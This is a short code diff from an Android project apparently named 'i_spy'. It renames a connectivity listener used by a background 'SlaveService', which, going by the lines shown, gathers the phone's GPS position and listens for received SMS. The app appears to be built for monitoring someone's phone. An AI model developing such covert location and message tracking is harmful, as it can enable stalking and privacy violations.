@@ -8,9 +8,9 @@ import android.net.Uri;
 import android.os.Handler;
 import android.support.annotation.Nullable;
 
-import com.um.asn.i_spy.listeners.ConnectionListener;
 import com.um.asn.i_spy.listeners.MessageReceiveListener;
 import com.um.asn.i_spy.listeners.MessageSendListner;
+import com.um.asn.i_spy.listeners.SlaveConnectionListener;
 import com.um.asn.i_spy.managers.PositionGPSManager;
 import com.um.asn.i_spy.models.Phone;
 
@@ -49,7 +49,7 @@ public class SlaveService extends IntentService {
         getPhone();
         handler.post(getGPS);
         // Pour enregistrer l'eventListner sur les changements de connexion (car deprecated dans Nougat)
-        registerReceiver(new ConnectionListener(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
+        registerReceiver(new SlaveConnectionListener(), new IntentFilter(ConnectivityManager.CONNECTIVITY_ACTION));
 
         // Pour enregistrer l'eventListner sur les sms reçus
         IntentFilter filtre = new IntentFilter();
